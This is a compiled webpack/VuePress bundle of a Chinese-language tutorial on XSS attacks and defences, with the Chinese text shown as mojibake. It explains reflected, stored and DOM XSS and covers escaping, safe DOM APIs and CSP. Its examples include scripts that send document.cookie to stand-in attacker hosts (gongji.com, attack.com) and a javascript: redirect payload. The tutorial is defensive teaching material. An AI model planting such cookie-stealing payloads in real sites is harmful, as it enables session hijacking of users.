(window.webpackJsonp=window.webpackJsonp||[]).push([[59],{377:function(t,a,s){"use strict";s.r(a);var e=s(25),r=Object(e.a)({},(function(){var t=this,a=t._self._c;return a("ContentSlotsDistributor",{attrs:{"slot-key":t.$parent.slotKey}},[a("h1",{attrs:{id:"web-å®‰å…¨"}},[a("a",{staticClass:"header-anchor",attrs:{href:"#web-å®‰å…¨"}},[t._v("#")]),t._v(" ğŸ‘‰ Web å®‰å…¨")]),t._v(" "),a("p",[t._v("å‚è€ƒæ–‡ç« ï¼š")]),t._v(" "),a("ul",[a("li",[a("p",[a("a",{attrs:{href:"https://tech.meituan.com/2018/09/27/fe-security.html",target:"_blank",rel:"noopener noreferrer"}},[t._v("å‰ç«¯å®‰å…¨ç³»åˆ—ï¼ˆä¸€ï¼‰ï¼šå¦‚ä½•é˜²æ­¢ XSS æ”»å‡»ï¼Ÿ"),a("OutboundLink")],1)])]),t._v(" "),a("li",[a("p",[a("a",{attrs:{href:"https://tech.meituan.com/2018/10/11/fe-security-csrf.html",target:"_blank",rel:"noopener noreferrer"}},[t._v("å‰ç«¯å®‰å…¨ç³»åˆ—ï¼ˆäºŒï¼‰ï¼šå¦‚ä½•é˜²æ­¢ CSRF æ”»å‡»ï¼Ÿ"),a("OutboundLink")],1)])])]),t._v(" "),a("h2",{attrs:{id:"xss-æ”»å‡»"}},[a("a",{staticClass:"header-anchor",attrs:{href:"#xss-æ”»å‡»"}},[t._v("#")]),t._v(" XSS æ”»å‡»")]),t._v(" "),a("h3",{attrs:{id:"ä»€ä¹ˆæ˜¯-xss-æ”»å‡»"}},[a("a",{staticClass:"header-anchor",attrs:{href:"#ä»€ä¹ˆæ˜¯-xss-æ”»å‡»"}},[t._v("#")]),t._v(" ä»€ä¹ˆæ˜¯ XSS æ”»å‡»ï¼Ÿ")]),t._v(" "),a("p",[t._v("è·¨ç«™è„šæœ¬æ”»å‡»(Cross-Site Scripting, XSS)ï¼Œä¸€ç§ä»£ç æ³¨å…¥æ”»å‡»ã€‚æœ¬è´¨æ˜¯é¡µé¢è¢«æ³¨å…¥æ¶æ„ä»£ç ï¼Œæµè§ˆå™¨æ— æ³•è¯†åˆ«è€Œå¯¼è‡´æ¶æ„è„šæœ¬è¢«æ‰§è¡Œã€‚")]),t._v(" "),a("h3",{attrs:{id:"xss-æ”»å‡»æœ‰å‡ ç§ç±»å‹"}},[a("a",{staticClass:"header-anchor",attrs:{href:"#xss-æ”»å‡»æœ‰å‡ ç§ç±»å‹"}},[t._v("#")]),t._v(" XSS æ”»å‡»æœ‰å‡ ç§ç±»å‹ï¼Ÿ")]),t._v(" "),a("h4",{attrs:{id:"åå°„å‹-xss-éæŒä¹…å‹"}},[a("a",{staticClass:"header-anchor",attrs:{href:"#åå°„å‹-xss-éæŒä¹…å‹"}},[t._v("#")]),t._v(" åå°„å‹ XSSï¼ˆéæŒä¹…å‹ï¼‰")]),t._v(" "),a("p",[t._v("æ¶æ„è„šæœ¬é€šè¿‡ä½œä¸ºç½‘ç»œè¯·æ±‚çš„å‚æ•°ï¼Œç»è¿‡æœåŠ¡å™¨å“åº”ï¼Œå¹¶åœ¨å“åº”å†…å®¹ä¸­å‡ºç°è¿™æ®µä»£ç ï¼Œç„¶ååå°„åˆ° HTML æ–‡æ¡£ä¸­ï¼Œæµè§ˆå™¨æ— æ³•è¯†åˆ«è€Œæ‰§è¡Œè§£æã€‚")]),t._v(" "),a("p",[t._v("ä¸€èˆ¬é€šè¿‡ URL æ³¨å…¥æ¶æ„ä»£ç /æ„é€ æ¶æ„é“¾æ¥è¯±æƒ‘ç”¨æˆ·ç‚¹å‡»ã€‚å¸¸è§äºç½‘ç«™æœç´¢ã€è·³è½¬ã€‚")]),t._v(" "),a("ul",[a("li",[t._v("åå°„å‹ XSS çš„æ”»å‡»æ­¥éª¤ï¼š")])]),t._v(" "),a("ol",[a("li",[t._v("æ”»å‡»è€…æ„é€ å‡ºç‰¹æ®Šçš„ URLï¼Œå…¶ä¸­åŒ…å«æ¶æ„ä»£ç ã€‚")]),t._v(" "),a("li",[t._v("ç”¨æˆ·æ‰“å¼€å¸¦æœ‰æ¶æ„ä»£ç çš„ URL æ—¶ï¼Œç½‘ç«™æœåŠ¡ç«¯å°†æ¶æ„ä»£ç ä» URL ä¸­å–å‡ºï¼Œæ‹¼æ¥åœ¨ HTML ä¸­è¿”å›ç»™æµè§ˆå™¨ã€‚")]),t._v(" "),a("li",[t._v("ç”¨æˆ·æµè§ˆå™¨æ¥æ”¶åˆ°å“åº”åè§£ææ‰§è¡Œï¼Œæ··åœ¨å…¶ä¸­çš„æ¶æ„ä»£ç ä¹Ÿè¢«æ‰§è¡Œã€‚")]),t._v(" "),a("li",[t._v("æ¶æ„ä»£ç çªƒå–ç”¨æˆ·æ•°æ®å¹¶å‘é€åˆ°æ”»å‡»è€…çš„ç½‘ç«™ï¼Œæˆ–è€…å†’å……ç”¨æˆ·çš„è¡Œä¸ºï¼Œè°ƒç”¨ç›®æ ‡ç½‘ç«™æ¥å£æ‰§è¡Œæ”»å‡»è€…æŒ‡å®šçš„æ“ä½œã€‚")])]),t._v(" "),a("div",{staticClass:"language- extra-class"},[a("pre",{pre:!0,attrs:{class:"language-text"}},[a("code",[t._v('http://chieminchan.com?q=<script>alert("ä½ å®Œè›‹äº†")<\/script>\n')])])]),a("h4",{attrs:{id:"å­˜å‚¨å‹-xss-æŒä¹…å‹"}},[a("a",{staticClass:"header-anchor",attrs:{href:"#å­˜å‚¨å‹-xss-æŒä¹…å‹"}},[t._v("#")]),t._v(" å­˜å‚¨å‹ XSSï¼ˆæŒä¹…å‹ï¼‰")]),t._v(" "),a("p",[t._v("æ¶æ„è„šæœ¬å­˜å‚¨åˆ°æœåŠ¡ç«¯çš„æ•°æ®åº“ï¼Œä½¿å¾—æ¯æ¬¡åŠ è½½é¡µé¢è¢«æ‰§è¡Œè€Œè¿›è¡Œæ¶æ„æ”»å‡»ã€‚")]),t._v(" "),a("p",[t._v("å¸¸è§äºå¸¦æœ‰ç”¨æˆ·ä¿å­˜æ•°æ®çš„ç½‘ç«™åŠŸèƒ½ï¼Œè®ºå›å‘å¸–ç•™è¨€ç­‰ï¼Œæäº¤ä¸€æ®µè„šæœ¬ä»£ç åå‰åç«¯æ²¡æœ‰åšå¥½è½¬ä¹‰å·¥ä½œè€Œç›´æ¥å°†è¯„è®ºå†…å®¹å­˜åˆ°äº†æ•°æ®åº“ã€‚")]),t._v(" "),a("p",[t._v("å­˜å‚¨å‹ XSS çš„æ”»å‡»æ­¥éª¤ï¼š")]),t._v(" "),a("ol",[a("li",[t._v("æ”»å‡»è€…å°†æ¶æ„ä»£ç æäº¤åˆ°ç›®æ ‡ç½‘ç«™çš„æ•°æ®åº“ä¸­ã€‚")]),t._v(" "),a("li",[t._v("ç”¨æˆ·æ‰“å¼€ç›®æ ‡ç½‘ç«™æ—¶ï¼Œç½‘ç«™æœåŠ¡ç«¯å°†æ¶æ„ä»£ç ä»æ•°æ®åº“å–å‡ºï¼Œæ‹¼æ¥åœ¨ HTML ä¸­è¿”å›ç»™æµè§ˆå™¨ã€‚")]),t._v(" "),a("li",[t._v("ç”¨æˆ·æµè§ˆå™¨æ¥æ”¶åˆ°å“åº”åè§£ææ‰§è¡Œï¼Œæ··åœ¨å…¶ä¸­çš„æ¶æ„ä»£ç ä¹Ÿè¢«æ‰§è¡Œã€‚")]),t._v(" "),a("li",[t._v("æ¶æ„ä»£ç çªƒå–ç”¨æˆ·æ•°æ®å¹¶å‘é€åˆ°æ”»å‡»è€…çš„ç½‘ç«™ï¼Œæˆ–è€…å†’å……ç”¨æˆ·çš„è¡Œä¸ºï¼Œè°ƒç”¨ç›®æ ‡ç½‘ç«™æ¥å£æ‰§è¡Œæ”»å‡»è€…æŒ‡å®šçš„æ“ä½œã€‚")])]),t._v(" "),a("p",[t._v("å°†ä»¥ä¸‹ä»£ç ä½œä¸ºè¯„è®ºå†…å®¹å‘é€ç»™æœåŠ¡ç«¯ï¼š")]),t._v(" "),a("div",{staticClass:"language-html extra-class"},[a("pre",{pre:!0,attrs:{class:"language-html"}},[a("code",[a("span",{pre:!0,attrs:{class:"token tag"}},[a("span",{pre:!0,attrs:{class:"token tag"}},[a("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v("<")]),t._v("p")]),a("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v(">")])]),t._v("\n    æ¬¢è¿æ‚¨\n    "),a("span",{pre:!0,attrs:{class:"token tag"}},[a("span",{pre:!0,attrs:{class:"token tag"}},[a("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v("<")]),t._v("img")]),t._v(" "),a("span",{pre:!0,attrs:{class:"token attr-name"}},[t._v("id")]),a("span",{pre:!0,attrs:{class:"token attr-value"}},[a("span",{pre:!0,attrs:{class:"token punctuation attr-equals"}},[t._v("=")]),a("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v('"')]),t._v("img"),a("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v('"')])]),t._v(" "),a("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v("/>")])]),t._v("\n    "),a("span",{pre:!0,attrs:{class:"token tag"}},[a("span",{pre:!0,attrs:{class:"token tag"}},[a("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v("<")]),t._v("script")]),a("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v(">")])]),a("span",{pre:!0,attrs:{class:"token script"}},[a("span",{pre:!0,attrs:{class:"token language-javascript"}},[t._v("\n        "),a("span",{pre:!0,attrs:{class:"token keyword"}},[t._v("var")]),t._v(" imgEle "),a("span",{pre:!0,attrs:{class:"token operator"}},[t._v("=")]),t._v(" document"),a("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v(".")]),a("span",{pre:!0,attrs:{class:"token function"}},[t._v("createElement")]),a("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v("(")]),a("span",{pre:!0,attrs:{class:"token string"}},[t._v('"img"')]),a("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v(")")]),a("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v(";")]),t._v("\n        imgEle"),a("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v(".")]),t._v("scr "),a("span",{pre:!0,attrs:{class:"token operator"}},[t._v("=")]),t._v(" "),a("span",{pre:!0,attrs:{class:"token template-string"}},[a("span",{pre:!0,attrs:{class:"token template-punctuation string"}},[t._v("`")]),a("span",{pre:!0,attrs:{class:"token string"}},[t._v("http://gongji.com?cookie=")]),a("span",{pre:!0,attrs:{class:"token interpolation"}},[a("span",{pre:!0,attrs:{class:"token interpolation-punctuation punctuation"}},[t._v("${")]),t._v("document"),a("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v(".")]),t._v("cookie"),a("span",{pre:!0,attrs:{class:"token interpolation-punctuation punctuation"}},[t._v("}")])]),a("span",{pre:!0,attrs:{class:"token template-punctuation string"}},[t._v("`")])]),a("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v(";")]),t._v("\n        imgEle"),a("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v(".")]),t._v("style"),a("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v(".")]),t._v("display "),a("span",{pre:!0,attrs:{class:"token operator"}},[t._v("=")]),t._v(" "),a("span",{pre:!0,attrs:{class:"token string"}},[t._v('"none"')]),a("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v(";")]),t._v("\n        document"),a("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v(".")]),t._v("body"),a("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v(".")]),a("span",{pre:!0,attrs:{class:"token function"}},[t._v("appenChild")]),a("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v("(")]),t._v("imgEle"),a("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v(")")]),a("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v(";")]),t._v("\n    ")])]),a("span",{pre:!0,attrs:{class:"token tag"}},[a("span",{pre:!0,attrs:{class:"token tag"}},[a("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v("</")]),t._v("script")]),a("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v(">")])]),t._v("\n"),a("span",{pre:!0,attrs:{class:"token tag"}},[a("span",{pre:!0,attrs:{class:"token tag"}},[a("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v("</")]),t._v("p")]),a("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v(">")])]),t._v("\n")])])]),a("h4",{attrs:{id:"dom-å‹-xss"}},[a("a",{staticClass:"header-anchor",attrs:{href:"#dom-å‹-xss"}},[t._v("#")]),t._v(" DOM å‹ XSS")]),t._v(" "),a("p",[t._v("DOM å‹ XSS æ˜¯åŸºäº DOMï¼Œåˆ©ç”¨äº†æµè§ˆå™¨è§£ææœºåˆ¶ï¼Œè®© JavaScript æ‰§è¡Œäº†æ¶æ„ä»£ç ï¼Œä¸€ç§å‘ç”Ÿåœ¨å®¢æˆ·ç«¯çš„æ”»å‡»ã€‚")]),t._v(" "),a("p",[t._v("å‰ç«¯ JavaScript ä»£ç ä¸å¤Ÿä¸¥è°¨ï¼ŒæŠŠä¸å¯ä¿¡çš„å†…å®¹æ’å…¥åˆ°äº†é¡µé¢ã€‚")]),t._v(" "),a("div",{staticClass:"language-html extra-class"},[a("pre",{pre:!0,attrs:{class:"language-html"}},[a("code",[a("span",{pre:!0,attrs:{class:"token tag"}},[a("span",{pre:!0,attrs:{class:"token tag"}},[a("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v("<")]),t._v("input")]),t._v(" "),a("span",{pre:!0,attrs:{class:"token attr-name"}},[t._v("id")]),a("span",{pre:!0,attrs:{class:"token attr-value"}},[a("span",{pre:!0,attrs:{class:"token punctuation attr-equals"}},[t._v("=")]),a("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v('"')]),t._v("input"),a("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v('"')])]),t._v(" "),a("span",{pre:!0,attrs:{class:"token attr-name"}},[t._v("type")]),a("span",{pre:!0,attrs:{class:"token attr-value"}},[a("span",{pre:!0,attrs:{class:"token punctuation attr-equals"}},[t._v("=")]),a("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v('"')]),t._v("text"),a("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v('"')])]),t._v(" "),a("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v("/>")])]),t._v("\n"),a("span",{pre:!0,attrs:{class:"token tag"}},[a("span",{pre:!0,attrs:{class:"token tag"}},[a("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v("<")]),t._v("button")]),t._v(" "),a("span",{pre:!0,attrs:{class:"token special-attr"}},[a("span",{pre:!0,attrs:{class:"token attr-name"}},[t._v("onclick")]),a("span",{pre:!0,attrs:{class:"token attr-value"}},[a("span",{pre:!0,attrs:{class:"token punctuation attr-equals"}},[t._v("=")]),a("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v('"')]),a("span",{pre:!0,attrs:{class:"token value javascript language-javascript"}},[t._v("container"),a("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v(".")]),t._v("innerHTML "),a("span",{pre:!0,attrs:{class:"token operator"}},[t._v("=")]),t._v(" input"),a("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v(".")]),t._v("value")]),a("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v('"')])])]),a("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v(">")])]),t._v("ç‚¹å‡»"),a("span",{pre:!0,attrs:{class:"token tag"}},[a("span",{pre:!0,attrs:{class:"token tag"}},[a("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v("</")]),t._v("button")]),a("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v(">")])]),t._v("\n\n"),a("span",{pre:!0,attrs:{class:"token tag"}},[a("span",{pre:!0,attrs:{class:"token tag"}},[a("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v("<")]),t._v("p")]),t._v(" "),a("span",{pre:!0,attrs:{class:"token attr-name"}},[t._v("id")]),a("span",{pre:!0,attrs:{class:"token attr-value"}},[a("span",{pre:!0,attrs:{class:"token punctuation attr-equals"}},[t._v("=")]),a("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v('"')]),t._v("container"),a("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v('"')])]),a("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v(">")])]),a("span",{pre:!0,attrs:{class:"token tag"}},[a("span",{pre:!0,attrs:{class:"token tag"}},[a("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v("</")]),t._v("p")]),a("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v(">")])]),t._v("\n")])])]),a("p",[t._v("å¦‚æœæ­¤æ—¶è¾“å…¥çš„å†…å®¹ä¸ºï¼š")]),t._v(" "),a("div",{staticClass:"language-html extra-class"},[a("pre",{pre:!0,attrs:{class:"language-html"}},[a("code",[t._v(" "),a("span",{pre:!0,attrs:{class:"token tag"}},[a("span",{pre:!0,attrs:{class:"token tag"}},[a("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v("<")]),t._v("script")]),a("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v(">")])]),t._v("fetch(`https://attack.com?cookie=${document.cookie}`)"),a("span",{pre:!0,attrs:{class:"token tag"}},[a("span",{pre:!0,attrs:{class:"token tag"}},[a("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v("</")]),t._v("Â·script")]),a("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v(">")])]),t._v("\n")])])]),a("p",[t._v("è¿™ä¸ªé—®é¢˜åé¢ h5 åŠ å…¥äº†å®‰å…¨è§„èŒƒï¼šä¸æ‰§è¡Œç”± innerHTML æ’å…¥çš„ script æ ‡ç­¾ã€‚")]),t._v(" "),a("h3",{attrs:{id:"å¦‚ä½•é˜²èŒƒ-xss-æ”»å‡»"}},[a("a",{staticClass:"header-anchor",attrs:{href:"#å¦‚ä½•é˜²èŒƒ-xss-æ”»å‡»"}},[t._v("#")]),t._v(" å¦‚ä½•é˜²èŒƒ XSS æ”»å‡»ï¼Ÿ")]),t._v(" "),a("h4",{attrs:{id:"é¢„é˜²åå°„å‹-xss-æ”»å‡»"}},[a("a",{staticClass:"header-anchor",attrs:{href:"#é¢„é˜²åå°„å‹-xss-æ”»å‡»"}},[t._v("#")]),t._v(" é¢„é˜²åå°„å‹ XSS æ”»å‡»")]),t._v(" "),a("ol",[a("li",[a("p",[t._v("æœåŠ¡ç«¯å¯¹ URL æ¥æ”¶åˆ°çš„å‚æ•°è¿›è¡Œè½¬è¯‘ï¼Œå¯¹å­—ç¬¦ä¸²è¿›è¡Œç¼–ç ï¼ˆencodeURIComponentï¼‰ã€‚æŠŠ Â & < > \" ' /Â  è¿™å‡ ä¸ªå­—ç¬¦è½¬ä¹‰æ‰")])]),t._v(" "),a("li",[a("p",[t._v("å‰åç«¯åˆ†ç¦»ï¼Œæ”¹æˆçº¯å‰ç«¯æ¸²æŸ“ï¼ŒæŠŠä»£ç å’Œæ•°æ®åˆ†éš”å¼€ã€‚")])])]),t._v(" "),a("h4",{attrs:{id:"é¢„é˜²å­˜å‚¨å‹-xss-æ”»å‡»"}},[a("a",{staticClass:"header-anchor",attrs:{href:"#é¢„é˜²å­˜å‚¨å‹-xss-æ”»å‡»"}},[t._v("#")]),t._v(" é¢„é˜²å­˜å‚¨å‹ XSS æ”»å‡»")]),t._v(" "),a("p",[t._v("å¯¹äºæ˜ç¡®çš„è¾“å…¥ç±»å‹ï¼Œä¾‹å¦‚æ•°å­—ã€URLã€ç”µè¯å·ç ã€é‚®ä»¶åœ°å€ç­‰ç­‰å†…å®¹ï¼Œè¿›è¡Œè¾“å…¥è¿‡æ»¤ã€‚")]),t._v(" "),a("ol",[a("li",[t._v("å®¢æˆ·ç«¯æäº¤å‰è¿›è¡Œæ ¡éªŒè¿‡æ»¤ï¼Œå¦‚æœåŒ…å«æ¶æ„è„šæœ¬åˆ™ä¸æäº¤ï¼Œæˆ–è€…æäº¤è½¬ä¹‰åçš„å­—ç¬¦ä¸²")]),t._v(" "),a("li",[t._v("æœåŠ¡ç«¯æ¥æ”¶åå…ˆæ ¡éªŒè¿‡æ»¤ï¼Œå¦‚æœåŒ…å«æ¶æ„è„šæœ¬åˆ™ä¸å­˜å‚¨åˆ°æ•°æ®åº“ï¼Œæˆ–è€…å­˜å‚¨è½¬ä¹‰åçš„å­—ç¬¦ä¸²")]),t._v(" "),a("li",[t._v("å®¢æˆ·ç«¯æ¸²æŸ“æ—¶å€™è¿›è¡Œè¿‡æ»¤ï¼Œå³ä½¿æ•°æ®åº“ä¸­å­˜å‚¨äº†æœªç»è½¬ä¹‰çš„æ¶æ„è„šæœ¬ï¼Œè¾“å‡ºè½¬ä¹‰åçš„å­—ç¬¦ä¸²")])]),t._v(" "),a("h4",{attrs:{id:"é¢„é˜²-dom-å‹-xss"}},[a("a",{staticClass:"header-anchor",attrs:{href:"#é¢„é˜²-dom-å‹-xss"}},[t._v("#")]),t._v(" é¢„é˜² DOM å‹ XSS")]),t._v(" "),a("ol",[a("li",[t._v("æ³¨æ„ç‰¹æ®Šçš„ HTML å±æ€§ã€JavaScript API")])]),t._v(" "),a("p",[t._v("1ï¼‰JS ä»£ç æ“æ§ DOM æ–‡æœ¬å†…å®¹æ—¶ï¼Œé¿å…æ‹¼æ¥ HTMLã€‚")]),t._v(" "),a("p",[t._v("åœ¨ä½¿ç”¨"),a("code",[t._v("v-html")]),t._v("ã€"),a("code",[t._v(".innerHTML")]),t._v("ã€"),a("code",[t._v(".outerHTML")]),t._v("ã€"),a("code",[t._v(".appendChild")]),t._v("ã€"),a("code",[t._v("document.write()")]),t._v("ç­‰ API æ—¶è¦ç‰¹åˆ«å°å¿ƒã€‚")]),t._v(" "),a("p",[t._v("å°½é‡ä½¿ç”¨ "),a("code",[t._v(".innerText")]),t._v("ã€"),a("code",[t._v(".textContent")]),t._v("ã€"),a("code",[t._v(".setAttribute()")]),t._v(" ç­‰ã€‚é¿å…åœ¨å­—ç¬¦ä¸²ä¸­æ‹¼æ¥åˆ°ä¸å¯ä¿¡æ•°æ®ã€‚")]),t._v(" "),a("p",[t._v("2ï¼‰ç»™å¯¹ DOM å’Œ JS ä¸­ï¼Œèƒ½å°†å­—ç¬¦ä¸²ä½œä¸ºä»£ç è¿è¡Œçš„ API è¿›è¡Œä¼ å‚æ•°æ—¶ï¼Œéœ€è¦è°¨æ…ã€‚")]),t._v(" "),a("p",[t._v("DOM ä¸­çš„å†…è”äº‹ä»¶ç›‘å¬å™¨ï¼Œå¦‚ "),a("code",[t._v("location")]),t._v("ã€"),a("code",[t._v("onclick")]),t._v("ã€"),a("code",[t._v("onerror")]),t._v("ã€"),a("code",[t._v("onload")]),t._v("ã€"),a("code",[t._v("onmouseover")]),t._v("ï¼Œ"),a("code",[t._v("href")]),t._v(" å±æ€§ï¼›é¿å…ä½¿ç”¨å†…è”äº‹ä»¶ï¼Œè€Œæ˜¯é€šè¿‡ "),a("code",[t._v(".addEventlistener()")]),t._v(" äº‹ä»¶ç»‘å®šä¼šæ›´å®‰å…¨ã€‚")]),t._v(" "),a("p",[t._v("JavaScript çš„ "),a("code",[t._v("eval()")]),t._v("ã€"),a("code",[t._v("setTimeout()")]),t._v("ã€"),a("code",[t._v("setInterval()")]),t._v(" ç­‰éƒ½èƒ½æŠŠå­—ç¬¦ä¸²ä½œä¸ºä»£ç è¿è¡Œã€‚")]),t._v(" "),a("p",[t._v("ä¼ å‚æ•°ç»™è¿™äº› API æ—¶éœ€è¦è°¨æ…ï¼Œè¦é¿å…åœ¨å­—ç¬¦ä¸²ä¸­æ‹¼æ¥åˆ°ä¸å¯ä¿¡æ•°æ®ï¼Œå¯ä½¿ç”¨ encodeURIComponent è¿›è¡Œè½¬è¯‘ã€‚")]),t._v(" "),a("div",{staticClass:"language-html extra-class"},[a("pre",{pre:!0,attrs:{class:"language-html"}},[a("code",[a("span",{pre:!0,attrs:{class:"token comment"}},[t._v("\x3c!-- æ”»å‡» URL ä¸º http://xxx/?redirect_to=javascript:alert('XSS') --\x3e")]),t._v("\n\n"),a("span",{pre:!0,attrs:{class:"token comment"}},[t._v("\x3c!-- è™½ç„¶ç»è¿‡è½¬ç§» --\x3e")]),t._v("\n"),a("span",{pre:!0,attrs:{class:"token tag"}},[a("span",{pre:!0,attrs:{class:"token tag"}},[a("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v("<")]),t._v("a")]),t._v(" "),a("span",{pre:!0,attrs:{class:"token attr-name"}},[t._v("href")]),a("span",{pre:!0,attrs:{class:"token attr-value"}},[a("span",{pre:!0,attrs:{class:"token punctuation attr-equals"}},[t._v("=")]),a("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v('"')]),t._v("<%= escapeHTML(getParameter("),a("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v('"')])]),a("span",{pre:!0,attrs:{class:"token attr-name"}},[t._v('redirect_to"))')]),t._v(" "),a("span",{pre:!0,attrs:{class:"token attr-name"}},[t._v("%")]),a("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v(">")])]),t._v('">è·³è½¬...'),a("span",{pre:!0,attrs:{class:"token tag"}},[a("span",{pre:!0,attrs:{class:"token tag"}},[a("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v("</")]),t._v("a")]),a("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v(">")])]),t._v("\n\n"),a("span",{pre:!0,attrs:{class:"token comment"}},[t._v("\x3c!-- è¿™æ®µä»£ç ï¼Œä¼šè¢«æœåŠ¡ç«¯å“åº”å°±æˆäº†ï¼š --\x3e")]),t._v("\n"),a("span",{pre:!0,attrs:{class:"token comment"}},[t._v("\x3c!-- è¿ javascript: è¿™æ ·çš„å­—ç¬¦ä¸²å¦‚æœå‡ºç°åœ¨ç‰¹å®šçš„ä½ç½®ä¹Ÿä¼šå¼•å‘ XSS æ”»å‡» --\x3e")]),t._v("\n"),a("span",{pre:!0,attrs:{class:"token tag"}},[a("span",{pre:!0,attrs:{class:"token tag"}},[a("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v("<")]),t._v("a")]),t._v(" "),a("span",{pre:!0,attrs:{class:"token attr-name"}},[t._v("href")]),a("span",{pre:!0,attrs:{class:"token attr-value"}},[a("span",{pre:!0,attrs:{class:"token punctuation attr-equals"}},[t._v("=")]),a("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v('"')]),t._v("javascript:alert("),a("span",{pre:!0,attrs:{class:"token entity",title:"&#x27;"}},[t._v("&#x27;")]),t._v("XSS"),a("span",{pre:!0,attrs:{class:"token entity",title:"&#x27;"}},[t._v("&#x27;")]),t._v(")"),a("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v('"')])]),a("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v(">")])]),t._v("è·³è½¬..."),a("span",{pre:!0,attrs:{class:"token tag"}},[a("span",{pre:!0,attrs:{class:"token tag"}},[a("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v("</")]),t._v("a")]),a("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v(">")])]),t._v("\n\n"),a("span",{pre:!0,attrs:{class:"token comment"}},[t._v('\x3c!-- å¯¹äºé“¾æ¥è·³è½¬ï¼Œå¦‚ <a href="xxx" æˆ– location.href="xxx"ï¼Œè¦æ£€éªŒå…¶å†…å®¹ï¼Œç¦æ­¢ä»¥ javascript: å¼€å¤´çš„é“¾æ¥ï¼Œå’Œå…¶ä»–éæ³•çš„ schemeã€‚ --\x3e')]),t._v("\n")])])]),a("h4",{attrs:{id:"content-security-policy-csp-å†…å®¹å®‰å…¨ç­–ç•¥"}},[a("a",{staticClass:"header-anchor",attrs:{href:"#content-security-policy-csp-å†…å®¹å®‰å…¨ç­–ç•¥"}},[t._v("#")]),t._v(" Content-Security-Policy ï¼ˆCSPï¼Œå†…å®¹å®‰å…¨ç­–ç•¥ï¼‰")]),t._v(" "),a("p",[t._v("åœ¨æœåŠ¡ç«¯ä½¿ç”¨ HTTP çš„ "),a("code",[t._v("Content-Security-Policy")]),t._v(" å¤´éƒ¨æ¥æŒ‡å®šç­–ç•¥ï¼Œæˆ–è€…åœ¨å‰ç«¯è®¾ç½® "),a("code",[t._v("meta")]),t._v(" æ ‡ç­¾ã€‚é€šè¿‡ CSP æŒ‡å®šæœ‰æ•ˆåŸŸï¼Œä½¿æµè§ˆå™¨è®¤å¯å¯æ‰§è¡Œè„šæœ¬æœ‰æ•ˆæ¥æºã€‚")]),t._v(" "),a("p",[t._v("ç­–ç•¥ä¸»è¦ä½œç”¨ï¼š"),a("br"),t._v("\n1ï¼‰ç¦æ­¢åŠ è½½å¤–åŸŸçš„èµ„æºï¼Œé˜²æ­¢å¤æ‚çš„æ”»å‡»é€»è¾‘ï¼›"),a("br"),t._v("\n2ï¼‰ç¦æ­¢å¤–åŸŸæäº¤ï¼Œç½‘ç«™è¢«æ”»å‡»åï¼Œç”¨æˆ·æ•°æ®ä¸ä¼šæ³„æ¼ï¼›"),a("br"),t._v("\n3ï¼‰ç¦æ­¢å†…è”è„šæœ¬ã€æœªæˆæƒçš„è„šæœ¬æ‰§è¡Œï¼›"),a("br"),t._v("\n4ï¼‰ä¸ŠæŠ¥è¿è§„æŠ¥å‘Šã€‚"),a("code",[t._v("report-uri http://report.example.com/xxx")])]),t._v(" "),a("div",{staticClass:"language-html extra-class"},[a("pre",{pre:!0,attrs:{class:"language-html"}},[a("code",[a("span",{pre:!0,attrs:{class:"token tag"}},[a("span",{pre:!0,attrs:{class:"token tag"}},[a("span",{pre:!0,attrs:{class:"token 